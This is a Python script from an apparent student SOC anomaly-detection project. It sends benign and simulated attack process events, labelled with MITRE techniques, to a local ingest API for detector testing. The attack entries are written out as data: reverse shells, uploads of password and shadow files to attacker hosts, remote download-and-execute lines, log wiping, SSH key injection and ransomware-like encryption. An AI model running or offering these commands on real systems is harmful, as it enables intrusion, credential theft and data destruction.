"""
generate_data.py — Кросс-платформенный симулятор атак для SOC Anomaly Detection.
Охватывает: Windows, Linux, macOS
"""
import requests
import time
import random

BASE_URL = "http://127.0.0.1:8000"
HEADERS = {"X-API-Key": "soc_diploma_secret_2026"}


# ─── 1. НОРМАЛЬНОЕ ПОВЕДЕНИЕ ─────────────────────────────────────────────────
# Реальные легитимные команды с разных платформ

normal_events = [
    # Windows — браузеры и офисные приложения
    {"process_name": "chrome.exe",    "command_line": "C:\\Program Files\\Google\\Chrome\\chrome.exe --type=renderer --no-sandbox",    "user": "alice"},
    {"process_name": "firefox.exe",   "command_line": "C:\\Program Files\\Mozilla Firefox\\firefox.exe -contentproc --type=tab",       "user": "bob"},
    {"process_name": "WINWORD.EXE",   "command_line": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n",            "user": "alice"},
    {"process_name": "explorer.exe",  "command_line": "C:\\Windows\\explorer.exe",                                                     "user": "system"},
    {"process_name": "svchost.exe",   "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",                              "user": "system"},
    {"process_name": "SearchHost.exe","command_line": "C:\\Windows\\SystemApps\\Microsoft.Windows.Search\\SearchHost.exe",             "user": "alice"},
    {"process_name": "Teams.exe",     "command_line": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\Teams\\Teams.exe --process=gpu",   "user": "alice"},
    {"process_name": "python.exe",    "command_line": "python manage.py runserver 127.0.0.1:8000",                                     "user": "dev"},
    {"process_name": "node.exe",      "command_line": "node server.js --port 3000",                                                    "user": "dev"},
    {"process_name": "git.exe",       "command_line": "git pull origin main",                                                          "user": "dev"},

    # Linux — стандартные системные процессы
    {"process_name": "systemd",       "command_line": "/lib/systemd/systemd --switched-root --system --deserialize 22",               "user": "root"},
    {"process_name": "nginx",         "command_line": "nginx: worker process",                                                         "user": "www-data"},
    {"process_name": "sshd",          "command_line": "/usr/sbin/sshd -D",                                                            "user": "root"},
    {"process_name": "cron",          "command_line": "/usr/sbin/cron -f",                                                            "user": "root"},
    {"process_name": "python3",       "command_line": "python3 /opt/app/worker.py --config /etc/app/config.yaml",                    "user": "appuser"},
    {"process_name": "rsync",         "command_line": "rsync -avz /var/backups/ backup@192.168.1.10:/backups/",                       "user": "backup"},
    {"process_name": "apt",           "command_line": "apt-get update",                                                               "user": "root"},
    {"process_name": "journalctl",    "command_line": "journalctl -u nginx --since today",                                            "user": "sysadmin"},

    # macOS — стандартные процессы
    {"process_name": "Finder",        "command_line": "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",                "user": "charlie"},
    {"process_name": "Safari",        "command_line": "/Applications/Safari.app/Contents/MacOS/Safari",                               "user": "charlie"},
    {"process_name": "Xcode",         "command_line": "/Applications/Xcode.app/Contents/MacOS/Xcode",                                "user": "dev"},
    {"process_name": "launchd",       "command_line": "/sbin/launchd",                                                                "user": "root"},
    {"process_name": "softwareupdate","command_line": "softwareupdate --list",                                                        "user": "root"},
]


# ─── 2. АТАКИ — WINDOWS ──────────────────────────────────────────────────────

windows_attacks = [
    # T1059.001 — PowerShell с обфускацией (critical)
    {
        "process_name": "powershell.exe",
        "command_line": (
            "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden "
            "-EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4"
            "AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGMALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAo"
        ),
        "user": "alice",
    },
    # T1059.003 + T1033 — Разведка через cmd (medium)
    {
        "process_name": "cmd.exe",
        "command_line": "whoami /all & net user & ipconfig /all & systeminfo",
        "user": "bob",
    },
    # T1105 + exfil — curl с прямой передачей данных (high)
    {
        "process_name": "curl.exe",
        "command_line": "curl -X POST http://185.220.101.45/exfiltrate --data @C:\\Users\\alice\\Documents\\passwords.txt",
        "user": "alice",
    },
    # T1197 — bitsadmin (high)
    {
        "process_name": "bitsadmin.exe",
        "command_line": "bitsadmin /transfer myJob /download /priority high http://evil.c2server.ru/payload.exe C:\\temp\\payload.exe",
        "user": "system",
    },
    # T1218 — LOLBin: rundll32 загружает DLL с URL (critical)
    {
        "process_name": "rundll32.exe",
        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://10.0.0.5/exploit.sct\")",
        "user": "alice",
    },
    # T1547.001 — Persistence via registry (high)
    {
        "process_name": "cmd.exe",
        "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\temp\\malware.exe /f",
        "user": "bob",
    },
    # T1053.005 — Scheduled Task (high)
    {
        "process_name": "schtasks.exe",
        "command_line": "schtasks /create /tn SystemHealthCheck /tr C:\\Windows\\Temp\\updater.exe /sc onlogon /ru SYSTEM /f",
        "user": "alice",
    },
    # T1003.001 — Mimikatz (critical)
    {
        "process_name": "powershell.exe",
        "command_line": "powershell -exec bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.100/mimikatz.ps1'); sekurlsa::logonpasswords\"",
        "user": "alice",
    },
    # T1070.001 — Очистка Event Logs (high)
    {
        "process_name": "cmd.exe",
        "command_line": "wevtutil cl System & wevtutil cl Security & wevtutil cl Application",
        "user": "alice",
    },
    # T1021.006 — PsExec lateral movement (critical)
    {
        "process_name": "PsExec.exe",
        "command_line": "psexec \\\\192.168.1.20 -u administrator -p P@ssw0rd cmd.exe /c whoami",
        "user": "bob",
    },
]


# ─── 3. АТАКИ — LINUX ────────────────────────────────────────────────────────

linux_attacks = [
    # T1059.004 + T1059.004 — Reverse shell через bash (critical)
    {
        "process_name": "bash",
        "command_line": "bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
        "user": "www-data",
    },
    # T1059.004 — Netcat reverse shell (critical)
    {
        "process_name": "sh",
        "command_line": "nc -e /bin/bash 10.10.10.5 1337",
        "user": "nobody",
    },
    # T1053.003 — Cron persistence (high)
    {
        "process_name": "bash",
        "command_line": "crontab -l | { cat; echo \"* * * * * curl -s http://10.0.0.1/backdoor.sh | bash\"; } | crontab -",
        "user": "www-data",
    },
    # T1003.008 — Shadow file dump (critical)
    {
        "process_name": "bash",
        "command_line": "cat /etc/shadow > /tmp/.shadow_backup && curl -F file=@/tmp/.shadow_backup http://attacker.com/collect",
        "user": "root",
    },
    # T1548.001 — SUID bit (high)
    {
        "process_name": "bash",
        "command_line": "chmod +s /tmp/evil_binary && /tmp/evil_binary",
        "user": "www-data",
    },
    # T1070.003 — История команд (medium)
    {
        "process_name": "bash",
        "command_line": "history -c; unset HISTFILE; export HISTSIZE=0",
        "user": "hacker",
    },
    # T1046 — nmap internal scan (high)
    {
        "process_name": "nmap",
        "command_line": "nmap -sV -sC -O 192.168.0.0/24 -oN /tmp/.scan_results",
        "user": "www-data",
    },
    # T1098.004 — SSH key injection (critical)
    {
        "process_name": "bash",
        "command_line": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@evil' >> /root/.ssh/authorized_keys",
        "user": "root",
    },
    # T1543.002 — Systemd persistence (high)
    {
        "process_name": "bash",
        "command_line": "cp /tmp/backdoor /usr/local/bin/sysupdate && systemctl enable sysupdate && systemctl start sysupdate",
        "user": "root",
    },
    # T1486 — Ransomware-like encryption (critical)
    {
        "process_name": "python3",
        "command_line": "python3 -c \"import os; [os.system(f'openssl enc -aes-256-cbc -in {f} -out {f}.enc -k s3cr3t') for f in os.listdir('/home')]\"",
        "user": "root",
    },
    # T1059.006 — Python download & exec (high)
    {
        "process_name": "python3",
        "command_line": "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://10.10.10.1/stage2.py').read())\"",
        "user": "appuser",
    },
    # mkfifo reverse shell (critical)
    {
        "process_name": "bash",
        "command_line": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 9001 > /tmp/f",
        "user": "nobody",
    },
]


# ─── 4. АТАКИ — macOS ────────────────────────────────────────────────────────

macos_attacks = [
    # T1543.001 — Launch Agent persistence (high)
    {
        "process_name": "bash",
        "command_line": "launchctl load ~/Library/LaunchAgents/com.apple.update.helper.plist",
        "user": "charlie",
    },
    # T1059.004 — Reverse shell через zsh (critical)
    {
        "process_name": "zsh",
        "command_line": "zsh -i >& /dev/tcp/185.100.87.50/4444 0>&1",
        "user": "charlie",
    },
    # T1082 — System recon (low/medium)
    {
        "process_name": "bash",
        "command_line": "uname -a && sw_vers && system_profiler SPHardwareDataType",
        "user": "charlie",
    },
    # T1070.003 — History clear macOS (medium)
    {
        "process_name": "zsh",
        "command_line": "history -p && unset HISTFILE && rm -f ~/.zsh_history ~/.bash_history",
        "user": "charlie",
    },
    # T1105 — wget с macOS (medium/high)
    {
        "process_name": "bash",
        "command_line": "wget -q -O /tmp/.update http://malicious-cdn.com/osx_backdoor && chmod +x /tmp/.update && /tmp/.update",
        "user": "charlie",
    },
]


# ─── Утилиты ─────────────────────────────────────────────────────────────────

def send_event(event: dict) -> None:
    try:
        resp = requests.post(f"{BASE_URL}/ingest", json=event, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            result = resp.json()
            sev_colors = {
                "critical": "\033[91m",  # красный
                "high":     "\033[93m",  # жёлтый
                "medium":   "\033[94m",  # синий
                "low":      "\033[96m",  # циан
                "normal":   "\033[92m",  # зелёный
            }
            sev = result.get("severity", "?")
            color = sev_colors.get(sev, "")
            reset = "\033[0m"
            print(
                f"  {color}[{sev.upper():8}]{reset} "
                f"{event['process_name']:20} | "
                f"score={result.get('anomaly_score', 0):.4f} | "
                f"mitre={result.get('mitre_technique') or 'none'}"
            )
        else:
            print(f"  [ERROR] {resp.status_code}: {resp.text[:80]}")
    except Exception as e:
        print(f"  [CONNECTION ERROR] {e} — убедись что FastAPI запущен!")


def send_batch(events: list, label: str, delay: float = 0.15) -> None:
    print(f"\n{'─'*60}")
    print(f"  {label}")
    print(f"{'─'*60}")
    for event in events:
        send_event(event)
        time.sleep(delay)


# ─── Main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "═"*60)
    print("  SOC ANOMALY DETECTION — Cross-Platform Attack Simulator")
    print("  Платформы: Windows + Linux + macOS")
    print("═"*60)

    # Шаг 1: нормальные данные (обучение модели)
    normal_sample = [random.choice(normal_events) for _ in range(25)]
    send_batch(normal_sample, "📋 Нормальная активность (обучение модели)", delay=0.05)

    # Шаг 2: Windows атаки
    send_batch(windows_attacks, "🪟 Windows Attack Scenarios", delay=0.2)

    # Шаг 3: Linux атаки
    send_batch(linux_attacks, "🐧 Linux Attack Scenarios", delay=0.2)

    # Шаг 4: macOS атаки
    send_batch(macos_attacks, "🍎 macOS Attack Scenarios", delay=0.2)

    print("\n" + "═"*60)
    print("  ✅ Симуляция завершена!")
    print(f"  Всего событий: {25 + len(windows_attacks) + len(linux_attacks) + len(macos_attacks)}")
    print("═"*60 + "\n")
